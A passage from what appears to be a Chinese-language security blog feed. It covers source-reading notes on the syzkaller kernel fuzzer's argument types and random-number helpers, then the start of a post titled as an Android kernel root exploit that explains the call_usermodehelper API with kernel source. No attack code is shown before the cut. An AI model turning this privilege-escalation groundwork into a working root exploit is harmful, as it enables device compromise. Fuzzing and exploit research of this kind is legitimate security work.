class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> arg.Address == <span class="number">0</span> &amp;&amp; arg.VmaSize == <span class="number">0</span> &amp;&amp; arg.Res == <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现参数接口Size()——返回参数大小<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *PointerArg)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> arg.typ.Size()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Data类型的参数"><a href="#Data类型的参数" class="headerlink" title="Data类型的参数"></a>Data类型的参数</h4><p>定义Data类型的参数<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> DataArg <span class="keyword">struct</span> &#123;</span><br><span class="line">ArgCommon</span><br><span class="line">data []<span class="keyword">byte</span>                <span class="comment">//切片数组用来保存输入in/输入输出inout参数</span></span><br><span class="line">size <span class="keyword">uint64</span>                <span class="comment">//data大小</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现Data参数类型的Size()接口方法——返回参数大小<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *DataArg)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(arg.data) != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">uint64</span>(<span class="built_in">len</span>(arg.data))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> arg.size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现Data参数类型的Data()方法——返回参数数据信息(只能是输入参数模式或者输入输出模式的参数)<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *DataArg)</span> <span class="title">Data</span><span class="params">()</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line"><span class="comment">//判断参数是否是输出参数</span></span><br><span class="line"><span class="keyword">if</span> arg.Type().Dir() == DirOut &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"getting data of output data arg"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> arg.data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Group类型的参数"><a href="#Group类型的参数" class="headerlink" title="Group类型的参数"></a>Group类型的参数</h4><p>Group类型的参数包括两类:结构体类型——StructType和数组类型——ArrayType<br>当Group类型是结构体类型时,Inner用来表示结构体中的成员<br>当Group类型是数组类型时,Inner来表示数组元素<br>实际上可以把结构体类型当成数组类型只是每个数组元素是不同的参数类型也相当于一个切片数组<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> GroupArg <span class="keyword">struct</span> &#123;</span><br><span class="line">ArgCommon</span><br><span class="line">Inner []Arg             <span class="comment">//切片数组:结构体成员或者数组元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现Group参数类型的Size()方法——返回Group类型的大小<br>对于结构体类型参数,需要循环遍历结构体的每个成员依次获取相应成员的大小然后计算出结构体大小总和<br>对于数组类型参数,需要循环遍历数组元素,统计总的数组元素的大小之和<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *GroupArg)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line">typ0 := arg.Type()</span><br><span class="line"><span class="keyword">if</span> !typ0.Varlen() &#123;</span><br><span class="line"><span class="keyword">return</span> typ0.Size()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断参数类型</span></span><br><span class="line"><span class="keyword">switch</span> typ := typ0.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="comment">//结构体类型</span></span><br><span class="line"><span class="keyword">case</span> *StructType:</span><br><span class="line"><span class="keyword">var</span> size <span class="keyword">uint64</span></span><br><span class="line"><span class="comment">//循环遍历结构体的每一个成员</span></span><br><span class="line"><span class="keyword">for</span> _, fld := <span class="keyword">range</span> arg.Inner &#123;</span><br><span class="line"><span class="keyword">if</span> !fld.Type().BitfieldMiddle() &#123;</span><br><span class="line"><span class="comment">//求和</span></span><br><span class="line">size += fld.Size()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> typ.AlignAttr != <span class="number">0</span> &amp;&amp; size%typ.AlignAttr != <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">//求和</span></span><br><span class="line">size += typ.AlignAttr - size%typ.AlignAttr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回该结构体类型的大小</span></span><br><span class="line"><span class="keyword">return</span> size</span><br><span class="line"><span class="comment">//数组类型</span></span><br><span class="line"><span class="keyword">case</span> *ArrayType:</span><br><span class="line"><span class="keyword">var</span> size <span class="keyword">uint64</span></span><br><span class="line"><span class="comment">//循环遍历数组元素</span></span><br><span class="line"><span class="keyword">for</span> _, elem := <span class="keyword">range</span> arg.Inner &#123;</span><br><span class="line"><span class="comment">//计算数组总的大小——求和</span></span><br><span class="line">size += elem.Size()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回数组类型的大小</span></span><br><span class="line"><span class="keyword">return</span> size</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">panic</span>(fmt.Sprintf(<span class="string">"bad group arg type %v"</span>, typ))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Union类型的参数"><a href="#Union类型的参数" class="headerlink" title="Union类型的参数"></a>Union类型的参数</h4><p>Union类型的参数定义:共用体、联合类型<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> UnionArg <span class="keyword">struct</span> &#123;</span><br><span class="line">ArgCommon</span><br><span class="line">Option Arg          <span class="comment">//共用体类型实际参数类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Union类型参数实现Size()——返回参数大小(返回当前共用体类型参数的大小)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *UnionArg)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !arg.Type().Varlen() &#123;</span><br><span class="line"><span class="keyword">return</span> arg.Type().Size()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回当前共用体参数类型的大小</span></span><br><span class="line"><span class="keyword">return</span> arg.Option.Size()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Resource类型的参数"><a href="#Resource类型的参数" class="headerlink" title="Resource类型的参数"></a>Resource类型的参数</h4><h5 id="ResultArg类型的参数"><a href="#ResultArg类型的参数" class="headerlink" title="ResultArg类型的参数"></a>ResultArg类型的参数</h5><p>资源类型的参数:kernel中Resource要么是一个常量值,要么是引用另外的一个Resource,或者是通过别的调用返回的值<br>资源类型的参数需要模拟引用,当资源类型的参数是某个系统调用返回时是ResultArg类型的参数,当资源类型的参数被别的资源类参数引用时,需要引用+1,资源类型的参数封装了一个map(键:参数,值:bool)用来表示资源类型的参数是否被使用<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ResultArg <span class="keyword">struct</span> &#123;</span><br><span class="line">ArgCommon</span><br><span class="line">Res   Arg                       <span class="comment">//当Resource类型的参数是引用另外的Resource时,Res代表引用的Resource参数</span></span><br><span class="line">OpDiv <span class="keyword">uint64</span>                    <span class="comment">//-1</span></span><br><span class="line">OpAdd <span class="keyword">uint64</span>                    <span class="comment">//+1</span></span><br><span class="line">Val   <span class="keyword">uint64</span>                    <span class="comment">//Res引用计数</span></span><br><span class="line">uses  <span class="keyword">map</span>[Arg]<span class="keyword">bool</span>             <span class="comment">//map,用来表示资源是否被ArgResult参数使用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现资源类型参数接口Size()——返回资源类型参数大小<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *ResultArg)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> arg.typ.Size()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现资源类型参数的Used()方法——返回map,便于查看使用该资源的参数<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *ResultArg)</span> <span class="title">Used</span><span class="params">()</span> *<span class="title">map</span>[<span class="title">Arg</span>]<span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;arg.uses</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现资源类型的的Uses()方法——此时的资源参数是引用别的资源参数,返回引用的资源参数<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *ResultArg)</span> <span class="title">Uses</span><span class="params">()</span> *<span class="title">Arg</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;arg.Res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ReturnArg类型参数"><a href="#ReturnArg类型参数" class="headerlink" title="ReturnArg类型参数"></a>ReturnArg类型参数</h5><p>ReturnArg类型参数是系统调用的返回值,包含:ResourceType类型的参数和VmaType类型的参数<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ReturnArg <span class="keyword">struct</span> &#123;</span><br><span class="line">ArgCommon</span><br><span class="line">uses <span class="keyword">map</span>[Arg]<span class="keyword">bool</span>               <span class="comment">//map,用来表示资源是否被ArgResult参数使用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现ReturnArg类型参数接口Size()——返回资源类型参数大小<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *ReturnArg)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"not called"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现资源类型参数的Used()方法——返回map,便于查看使用该资源的参数<br>prog/prog.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(arg *ReturnArg)</span> <span class="title">Used</span><span class="params">()</span> *<span class="title">map</span>[<span class="title">Arg</span>]<span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;arg.uses</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="系统调用总结"><a href="#系统调用总结" class="headerlink" title="系统调用总结"></a>系统调用总结</h3><p>描述一个系统调用需要包含系统调用号、系统调用名以及系统调用使用的参数个数、每个参数的类型和参数的值，最后还有系统调用的返回值类型和返回值等。<br>这里把系统调用封装在Call类型中,包含了系统调用描述Syscall(包含系统调用名称、系统调用号、系统调用参数类型的切片数组和系统调用返回值类型等信息)、系统调用参数切片数组(用来获取系统调用参数的值和大小等)、系统调用返回值(值和大小),这样一个完整的系统调用便成型了,包含了一个系统调用所有的信息。<br>而参数最重要的是参数个数,每一个参数类型,参数的值,所以对于不同参数类型进行了相应的定义和实现,如Const类型的参数、结构体类型的参数和数组参数、资源参数等。</p></the>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;本文摘要——&quot;&gt;&lt;a href=&quot;#本文摘要——&quot; class=&quot;headerlink&quot; title=&quot; 本文摘要——   &quot;&gt;&lt;/a&gt;&lt;strong&gt; 本文摘要—— syzkaller_source_read_syscall_type_and_function &lt;/strong&gt; &lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页:摘要=&quot;&quot;&gt;&lt;/excerpt&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="syzkaller" scheme="https://0x9k.club/tags/syzkaller/"/>
    
      <category term="fuzzer" scheme="https://0x9k.club/tags/fuzzer/"/>
    
  </entry>
  
  <entry>
    <title>syzkaller_source_read_rand_type_and_function</title>
    <link href="https://0x9k.club/posts/uncategorized/2018-05-02-syzkaller_source_read_rand_type_and_function.html"/>
    <id>https://0x9k.club/posts/uncategorized/2018-05-02-syzkaller_source_read_rand_type_and_function.html</id>
    <published>2018-05-02T15:37:53.000Z</published>
    <updated>2018-05-02T15:37:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="本文摘要——"><a href="#本文摘要——" class="headerlink" title=" 本文摘要——   "></a><strong> 本文摘要—— syzkaller_source_read_rand_type_and_function </strong> <excerpt in="" index="" |="" 首页:摘要=""></excerpt></h1><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="syzkaller源码阅读之随机数类型以及相关的函数"><a href="#syzkaller源码阅读之随机数类型以及相关的函数" class="headerlink" title="syzkaller源码阅读之随机数类型以及相关的函数"></a>syzkaller源码阅读之随机数类型以及相关的函数</h2><h3 id="随机数类型"><a href="#随机数类型" class="headerlink" title="随机数类型"></a>随机数类型</h3><p>随机数类型randGen:封装golang标准库math/rand中的Rand,用来后续生成随机数,randGen还包含了和目标系统相关的描述Target类型<br>相关的类型和函数实现在prog/rand.go文件中实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> randGen <span class="keyword">struct</span> &#123;</span><br><span class="line">*rand.Rand</span><br><span class="line">target           *Target</span><br><span class="line">inCreateResource <span class="keyword">bool</span></span><br><span class="line">recDepth         <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fuzz中和生成、变异相关的函数"><a href="#fuzz中和生成、变异相关的函数" class="headerlink" title="fuzz中和生成、变异相关的函数"></a>fuzz中和生成、变异相关的函数</h3><p>1、通过标准库中的Intn函数生成[0,n)范围内的随机数<br>prog/rand.go文件中实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">rand</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">uint64</span>(r.Intn(n))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、生成[begin,end)范围内的随机数<br>prog/rand.go文件中实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">randRange</span><span class="params">(begin, end <span class="keyword">uint64</span>)</span> <span class="title">uint64</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> begin + <span class="keyword">uint64</span>(r.Intn(<span class="keyword">int</span>(end-begin+<span class="number">1</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、生成[0,2)范围内的随机数并判断是否为0,即50%的概率返回true<br>prog/rand.go文件中实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">bin</span><span class="params">()</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> r.Intn(<span class="number">2</span>) == <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、生成[0,n)范围内的随机数并判断是否为0,即1/n的概率返回true<br>prog/rand.go文件中实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">oneOf</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> r.Intn(n) == <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5、有偏随机数,更有偏向的生成随机数,生成的随机数的概率不等<br>prog/rand.go文件中实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">biasedRand</span><span class="params">(n, k <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">nf, kf := <span class="keyword">float64</span>(n), <span class="keyword">float64</span>(k)</span><br><span class="line">rf := nf * (kf/<span class="number">2</span> + <span class="number">1</span>) * r.Float64()</span><br><span class="line">bf := (<span class="number">-1</span> + math.Sqrt(<span class="number">1</span>+<span class="number">2</span>*kf*rf/nf)) * nf / kf</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">int</span>(bf)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6、返回[0,outOf)范围内的随机数并判断生成的随机数是否小于n,即返回true的概率是n/outOf<br>prog/rand.go文件中实现</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">nOutOf</span><span class="params">(n, outOf <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> n &lt;= <span class="number">0</span> || n &gt;= outOf &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"bad probability"</span>)</span><br><span class="line">&#125;</span><br><span class="line">v := r.Intn(outOf)</span><br><span class="line"><span class="keyword">return</span> v &lt; n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="随机类型操作Target类型实现变异和生成-从而进行fuzz"><a href="#随机类型操作Target类型实现变异和生成-从而进行fuzz" class="headerlink" title="随机类型操作Target类型实现变异和生成,从而进行fuzz"></a>随机类型操作Target类型实现变异和生成,从而进行fuzz</h3><p>由于随机类型中包含了Target类型,Target类型中包含了相关目标系统体系结构和系统调用、资源等信息,<br>这里通过随机数类型randGen可以对Target中的系统调用进行操作,比如生成和变异——fuzz中常见的两种方式</p></the>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;本文摘要——&quot;&gt;&lt;a href=&quot;#本文摘要——&quot; class=&quot;headerlink&quot; title=&quot; 本文摘要——   &quot;&gt;&lt;/a&gt;&lt;strong&gt; 本文摘要—— syzkaller_source_read_rand_type_and_function &lt;/strong&gt; &lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页:摘要=&quot;&quot;&gt;&lt;/excerpt&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="syzkaller" scheme="https://0x9k.club/tags/syzkaller/"/>
    
      <category term="fuzzer" scheme="https://0x9k.club/tags/fuzzer/"/>
    
  </entry>
  
  <entry>
    <title>new_reliable_android_kernel_root_exploit</title>
    <link href="https://0x9k.club/posts/uncategorized/2018-05-02-new_reliable_android_kernel_root_exploit.html"/>
    <id>https://0x9k.club/posts/uncategorized/2018-05-02-new_reliable_android_kernel_root_exploit.html</id>
    <published>2018-05-02T15:37:23.000Z</published>
    <updated>2018-05-02T15:37:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="本文摘要——"><a href="#本文摘要——" class="headerlink" title=" 本文摘要——   "></a><strong> 本文摘要—— new_reliable_android_kernel_root_exploit </strong> <excerpt in="" index="" |="" 首页摘要=""></excerpt></h1><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="new-eliable-android-kernel-root-exploit"><a href="#new-eliable-android-kernel-root-exploit" class="headerlink" title="new eliable android kernel root exploit"></a>new eliable android kernel root exploit</h2><h3 id="call-usermodehelper-api简介"><a href="#call-usermodehelper-api简介" class="headerlink" title="call_usermodehelper api简介"></a>call_usermodehelper api简介</h3><p>call_usermodehelper api可以在内核空间调用用户空间的应用程序,执行用户空间的命令</p><h4 id="call-usermodehelper三种模式"><a href="#call-usermodehelper三种模式" class="headerlink" title="call_usermodehelper三种模式"></a>call_usermodehelper三种模式</h4><p>call_usermodehelper三种调用用户空间程序的模式<br>1、UMH_NO_WAIT 不等待<br>2、UMH_WAIT_EXEC 等待程序启动<br>3、UMH_WAIT_PROC 等待程序结束</p><h4 id="call-usermodehelper-api调用分析"><a href="#call-usermodehelper-api调用分析" class="headerlink" title="call_usermodehelper api调用分析"></a>call_usermodehelper api调用分析</h4><p>call_usermodehelper实际上是调用call_usermodehelper_fns,分为后面几个步骤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/kmod.h#L106</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span><br><span class="line">call_usermodehelper(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">enum</span> umh_wait wait)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_fns(path, argv, envp, wait,</span><br><span class="line">       <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/include/linux/kmod.h#L86</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span><br><span class="line">call_usermodehelper_fns(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp,</span><br><span class="line"><span class="keyword">enum</span> umh_wait wait,</span><br><span class="line"><span class="keyword">int</span> (*init)(struct subprocess_info *info),</span><br><span class="line"><span class="keyword">void</span> (*cleanup)(struct subprocess_info *), <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(path, argv, envp, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">call_usermodehelper_setfns(info, init, cleanup, data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1、call-usermodehelper-setup设置要执行的用户空间的程序、环境变量、handler-包含初始化函数init和清理函数cleanup-等信息-相关信息填充到subprocess-info结构体中-其中-call-usermodehelper为添加到内核队列中的handler"><a href="#1、call-usermodehelper-setup设置要执行的用户空间的程序、环境变量、handler-包含初始化函数init和清理函数cleanup-等信息-相关信息填充到subprocess-info结构体中-其中-call-usermodehelper为添加到内核队列中的handler" class="headerlink" title="1、call_usermodehelper_setup设置要执行的用户空间的程序、环境变量、handler(包含初始化函数init和清理函数cleanup)等信息,相关信息填充到subprocess_info结构体中,其中__call_usermodehelper为添加到内核队列中的handler"></a>1、call_usermodehelper_setup设置要执行的用户空间的程序、环境变量、handler(包含初始化函数init和清理函数cleanup)等信息,相关信息填充到subprocess_info结构体中,其中__call_usermodehelper为添加到内核队列中的handler</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//elixir.bootlin.com/linux/v2.6.35/source/kernel/kmod.c#L331</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> subprocess_info *call_usermodehelper_setup(char *path, char **argv,</span><br><span class="line">  char **envp, gfp_t gfp_mask)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">struct</span> subprocess_info *sub_info;</span><br><span class="line"><span class="comment">//创建subprocess_info</span></span><br><span class="line">sub_info = kzalloc(sizeof(<span class="keyword">struct</span> subprocess_info), gfp_mask);</span><br><span class="line"><span class="keyword">if</span> (!sub_info)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置subprocess_info</span></span><br><span class="line">    <span class="comment">//设置sub_info-&gt;work ===&gt; __call_usermodehelper</span></span><br><span class="line">INIT_WORK(&amp;sub_info-&gt;work, __call_usermodehelper);</span><br><span class="line">sub_info-&gt;path = path;<span 